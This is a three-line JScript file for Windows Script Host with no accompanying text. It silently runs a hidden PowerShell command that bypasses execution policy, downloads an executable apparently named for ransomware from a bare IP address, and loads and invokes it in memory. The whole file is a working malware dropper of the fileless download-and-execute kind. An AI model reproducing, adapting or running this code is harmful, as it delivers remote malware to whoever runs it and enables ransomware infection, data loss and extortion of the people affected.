a = new ActiveXObject('Wscript.Shell');
cmd = "powershell -ep Bypass -nop -noexit -c ([System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://18.185.124.52/ransinvoke.exe')).EntryPoint.Invoke($Null,$Null))";
a.Run(cmd,0);
